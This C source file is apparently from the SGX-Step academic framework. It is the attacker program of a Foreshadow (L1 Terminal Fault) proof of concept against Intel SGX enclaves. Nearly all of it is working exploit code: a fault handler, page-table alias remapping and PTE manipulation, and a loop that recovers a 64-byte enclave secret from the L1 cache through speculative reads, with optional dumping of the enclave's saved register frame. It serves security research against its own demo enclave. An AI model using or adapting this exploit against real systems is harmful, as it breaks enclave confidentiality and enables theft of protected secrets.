/*
 *  This file is part of the SGX-Step enclave execution control framework.
 *
 *  Copyright (C) 2017 Jo Van Bulck <jo.vanbulck@cs.kuleuven.be>,
 *                     Raoul Strackx <raoul.strackx@cs.kuleuven.be>
 *
 *  SGX-Step is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  SGX-Step is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with SGX-Step. If not, see <http://www.gnu.org/licenses/>.
 */

#include <sgx_urts.h>
#include "Enclave/encl_u.h"
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>

#include "libsgxstep/apic.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/foreshadow.h"
#include "libsgxstep/cache.h"

#define USE_TSX             1
#define DUMP_SSA            0
#define ITER_RELOAD         1
#define SECRET_BYTES        64      /* read entire cache line */

#define DEBUG_ENCLAVE	    1
#define RELEASE_ENCLAVE	    0

#define ENCLAVE_SO	"Enclave/encl.so"
#define ENCLAVE_MODE 	DEBUG_ENCLAVE

void *secret_ptr = NULL, *secret_page = NULL, *alias_ptr = NULL, *ssa_gprsgx = NULL, *alias_ssa_gprsgx = NULL;
uint64_t *pte_alias = NULL, *pte_alias_gprsgx = NULL;
uint64_t pte_alias_unmapped = 0x0;

gprsgx_region_t shadow_gprsgx = {0x00};

int fault_fired = 0, cur_byte = 0;
sgx_enclave_id_t eid = 0;

/* ================== ATTACKER IRQ/FAULT HANDLERS ================= */

/* Called upon SIGSEGV caused by untrusted page tables. */
void fault_handler(int signal)
{
    fault_fired++;

    /* remap enclave page, so abort page semantics apply and execution can continue. */
    *pte_alias = MARK_PRESENT(pte_alias_unmapped);
    ASSERT( !mprotect( (void*) (((uint64_t) alias_ptr) & ~PFN_MASK), 0x1000, PROT_READ | PROT_WRITE));

    #if DUMP_SSA
        if ( !(cur_byte = foreshadow_ssa(&shadow_gprsgx, alias_ssa_gprsgx)) )
        {
            /* restore access on trigger page to allow enclave to finish execution */
            printf("\n");
            info("finishing enclave execution (restoring trigger access rights)");
            ASSERT(!mprotect(secret_page, 0x1000, PROT_READ | PROT_WRITE));
        }
        else
        {
            if (fault_fired == 1)
                printf("[#PF handler] ERESUME prefetch to refresh GPRSGX region; byte: ");
            printf("%d ", cur_byte);
        }
    #endif
}

/* ================== ATTACKER INIT/SETUP ================= */

/* Configure and check attacker untrusted runtime environment. */
void attacker_config_runtime(void)
{
    ASSERT( !claim_cpu(VICTIM_CPU) );
    ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) );
    ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);

    register_enclave_info();
    print_enclave_info();
}

void unmap_alias(void)
{
    /* NOTE: we use mprotect so Linux is aware we unmapped the page and
     * delivers the exception to our user space handler, but we revert PTE
     * inversion mitgation manually afterwards */
    ASSERT( !mprotect( (void*) (((uint64_t) alias_ptr) & ~PFN_MASK), 0x1000, PROT_NONE ));
    *pte_alias = pte_alias_unmapped;
}

void attacker_config_page_table(void)
{
    /* benchmark enclave trigger page and SSA frame addresses */
    SGX_ASSERT( enclave_generate_secret( eid, &secret_ptr) );
	secret_page = (void *)( (uint64_t) secret_ptr & ~UINT64_C(0xfff) );

    /* establish independent virtual alias mapping for enclave secret */
    alias_ptr = remap_page_table_level( secret_ptr, PAGE);
    info("Randomly generated enclave secret at %p (page %p); alias at %p (revoking alias access rights)",
        secret_ptr, secret_page, alias_ptr);
    print_pte_adrs(secret_ptr);

    /* ensure a #PF on trigger accesses through the *alias* mapping */
    ASSERT( pte_alias = remap_page_table_level( alias_ptr, PTE) );
    pte_alias_unmapped = MARK_NOT_PRESENT(*pte_alias);
    unmap_alias();
    print_pte(pte_alias);

    #if DUMP_SSA
        ssa_gprsgx = get_enclave_ssa_gprsgx_adrs();
        alias_ssa_gprsgx = remap_page_table_level( ssa_gprsgx, PAGE );
        info("enclave SSA GPRSGX region at %p; alias at %p (revoking alias access rights)",
            ssa_gprsgx, alias_ssa_gprsgx);
        print_pte_adrs(ssa_gprsgx);

        ASSERT( pte_alias_gprsgx = remap_page_table_level( alias_ssa_gprsgx, PTE) );
        *pte_alias_gprsgx = MARK_NOT_PRESENT(*pte_alias_gprsgx);
        print_pte(pte_alias_gprsgx);
    #endif
}

void attacker_restore_runtime(void)
{
    restore_system_state();
}

/* ================== ATTACKER MAIN ================= */

/* Untrusted main function to create/enter the trusted enclave. */
int main( int argc, char **argv )
{
    sgx_launch_token_t token = {0};
    int i, updated = 0;
    uint8_t real[SECRET_BYTES] = {0x0};
    uint8_t recovered[SECRET_BYTES] = {0x0};
    
    info("Creating enclave...");
    SGX_ASSERT( sgx_create_enclave( ENCLAVE_SO, ENCLAVE_MODE,
                                    &token, &updated, &eid, NULL ) );

    /* configure attack untrusted runtime */
    attacker_config_runtime();
    attacker_config_page_table();
    foreshadow_init();

    /* enter enclave and extract secrets */
    info_event("Foreshadow secret extraction");
    info("prefetching enclave secret (EENTER/EEXIT)...");
	SGX_ASSERT( enclave_reload( eid, secret_ptr ) );

    info("extracting secret from L1 cache..");
    for (i=0; i < SECRET_BYTES; i++)
    {
        #if !USE_TSX
            unmap_alias();
        #endif
        #if ITER_RELOAD
            SGX_ASSERT( enclave_reload( eid, secret_ptr ) );
        #endif
        recovered[i] = foreshadow(alias_ptr+i);
    }

    info("verifying and destroying enclave secret..");
	SGX_ASSERT( enclave_destroy_secret( eid, real) );
    foreshadow_compare_secret(recovered, real, SECRET_BYTES);

    #if DUMP_SSA
        info_event("Foreshadow SSA frame extraction");
        info("revoking trigger secret access rights..");
        ASSERT( !mprotect( secret_page, 0x1000, PROT_NONE ));
        sgx_step_eresume_cnt = 0;
        SGX_ASSERT( enclave_run( eid ) );

        ASSERT(fault_fired);
        dump_gprsgx_region(&shadow_gprsgx);
        foreshadow_dump_perf();
        info("total of %d faulting ERESUME calls needed", sgx_step_eresume_cnt); 
    #endif

    attacker_restore_runtime();
    return 0;
}
